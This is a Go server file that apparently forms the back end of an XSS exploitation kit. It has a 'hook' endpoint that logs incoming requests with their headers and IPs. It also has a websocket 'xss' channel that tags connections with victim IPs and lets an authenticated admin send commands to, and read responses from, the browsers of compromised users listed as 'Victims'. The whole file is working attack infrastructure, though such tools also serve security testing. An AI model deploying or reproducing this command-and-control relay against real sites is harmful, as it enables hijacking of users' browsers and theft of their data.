package main

import (
	b64 "encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"time"
	"webhook/constant"
	"webhook/container"
	"webhook/model"
	"webhook/socket"

	"github.com/gin-contrib/static"
	"github.com/gin-gonic/gin"
	"github.com/olahol/melody"
	"github.com/twinj/uuid"
	"gopkg.in/mgo.v2/bson"
)

var (
	configPath string
)

func main() {
	flag.Parse()
	err := container.Setup(configPath)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	route()
}

func route() {
	var sessionMgr = socket.NewMgr()

	r := gin.Default()
	m := melody.New()
	r.LoadHTMLGlob("templates/*")
	r.Use(static.Serve("/static", static.LocalFile("static", false)))

	authorized := r.Group("/admin", gin.BasicAuth(gin.Accounts{
		container.Get().Config.User: container.Get().Config.Pass,
	}))

	hook := r.Group("/hook")
	{
		hook.GET("", hookRequest)
		hook.PATCH("", hookRequest)
		hook.POST("", hookRequest)
		hook.PUT("", hookRequest)
		hook.DELETE("", hookRequest)
		hook.OPTIONS("", hookRequest)
		hook.HEAD("", hookRequest)
	}

	m.HandleConnect(func(sess *melody.Session) {
		id := socket.GetIDFromSession(sess)
		if !strings.Contains(sess.Request.URL.Path, "/admin/") {
			if sessionMgr.Exist(id) {
				sess.Close()
			} else {
				sessionMgr.Set(id, sess)
			}
		} else {
			authenHeader := sess.Request.Header.Get("Authorization")
			authenHeader = strings.TrimSpace(strings.Replace(authenHeader, "Basic", "", 1))
			uDec, _ := b64.URLEncoding.DecodeString(authenHeader)
			if string(uDec) != container.Get().Config.User+":"+container.Get().Config.Pass {
				sess.Close()
			}
		}
	})

	m.HandleDisconnect(func(sess *melody.Session) {
		id := socket.GetIDFromSession(sess)
		sessionMgr.Delete(id)
	})

	xssRCE := r.Group("/xss")
	{
		xssRCE.GET("/channel/:name/ws", func(c *gin.Context) {
			c.Request.Header.Set(constant.HEADER_VICTIM_IP, getRealIp(c))
			c.Request.Header.Set(constant.HEADER_VICTIM_DATE, getCurrentTime())
			m.HandleRequest(c.Writer, c.Request)
		})

	}

	m.HandleMessage(func(s *melody.Session, msg []byte) {
		m.BroadcastFilter(msg, func(q *melody.Session) bool {
			if strings.Contains(s.Request.URL.Path, "/admin") {
				return q.Request.URL.Path == strings.Replace(s.Request.URL.Path, "/admin", "", 1)
			} else {
				return q.Request.URL.Path == "/admin"+s.Request.URL.Path
			}
		})
	})

	//admin
	authorized.GET("/hook/view", getAllHookRequest)
	authorized.GET("/hook/view/:id", getHookRequest)
	authorized.GET("/hook/del/:id", delHookRequest)
	authorized.GET("/xss/channel/:name/ws", func(c *gin.Context) {
		m.HandleRequest(c.Writer, c.Request)
	})
	authorized.GET("/xss/channel/:name/delete", func(c *gin.Context) {
		id := c.Param("name")
		sessionMgr.Delete(id)
		c.Redirect(http.StatusFound, "/admin/xss/channels")
	})
	authorized.GET("/xss/channel/:name", func(c *gin.Context) {
		id := c.Param("name")
		channel, _ := sessionMgr.Get(id)
		c.HTML(http.StatusOK, "xss_rce.html", gin.H{
			"Channel": channel,
		})
	})
	authorized.GET("/xss/channels", func(c *gin.Context) {
		channels := sessionMgr.GetAll()
		c.HTML(http.StatusOK, "xss_channels.html", gin.H{
			"Victims": channels,
		})
	})

	r.Run(container.Get().Config.Listen)
}

func delHookRequest(c *gin.Context) {
	id := c.Param("id")
	err := container.Get().DB.C(constant.TABLE_REQUEST).Remove(bson.M{"id": id})
	if err != nil {
		panic(err)
	}

	c.Redirect(http.StatusFound, "/admin/hook/view")
}

func getHookRequest(c *gin.Context) {
	id := c.Param("id")
	var req model.Req
	err := container.Get().DB.C(constant.TABLE_REQUEST).Find(bson.M{"id": id}).One(&req)
	if err != nil {
		panic(err)
	}

	u, err := url.Parse(req.Url)
	if err != nil {
		panic(err)
	}

	var query = make(map[string]interface{})
	m, _ := url.ParseQuery(u.RawQuery)
	for k, v := range m {
		query[k] = v
	}

	c.HTML(http.StatusOK, "hook_detail.html", gin.H{
		"Req":   req,
		"Query": query,
	})
}

func getAllHookRequest(c *gin.Context) {
	var reqs []model.Req
	err := container.Get().DB.C(constant.TABLE_REQUEST).Find(nil).Sort("-date").All(&reqs)
	if err != nil {
		panic(err)
	}

	c.HTML(http.StatusOK, "hook.html", gin.H{
		"Reqs": reqs,
	})
}

func hookRequest(c *gin.Context) {
	var req model.Req

	body, err := ioutil.ReadAll(c.Request.Body)
	if err == nil {
		req.Body = string(body)
	}

	host := getRealHost(c)

	req.Url = host + c.Request.RequestURI
	if c.Request.TLS == nil {
		req.Url = "http://" + req.Url
	} else {
		req.Url = "https://" + req.Url
	}

	req.ClientIp = getRealIp(c)

	req.Header = c.Request.Header
	req.Date = getCurrentTime()
	req.Method = c.Request.Method
	req.Id = uuid.NewV4().String()

	err = container.Get().DB.C(constant.TABLE_REQUEST).Insert(req)
	if err != nil {
		panic(err)
	}

	c.JSON(http.StatusOK, req)
}

func getRealIp(c *gin.Context) string {
	clientIp := c.Request.Header.Get(constant.HEADER_VICTIM_IP)
	if clientIp == "" {
		clientIp = c.ClientIP()
	}
	c.Request.Header.Del(constant.HEADER_VICTIM_IP)
	return clientIp
}

func getRealHost(c *gin.Context) string {
	host := c.Request.Header.Get(constant.HEADER_VICTIM_HOST)
	if host == "" {
		host = c.ClientIP()
	}
	c.Request.Header.Del(constant.HEADER_VICTIM_HOST)
	return host
}

func getCurrentTime() string {
	loc, _ := time.LoadLocation("Asia/Ho_Chi_Minh")
	return time.Now().In(loc).Format(constant.HH_MM_SS_DD_MM_YYYY)
}

func init() {
	flag.StringVar(&configPath, "config", "config.toml", "location of the config file")
	runtime.GOMAXPROCS(runtime.NumCPU())
}
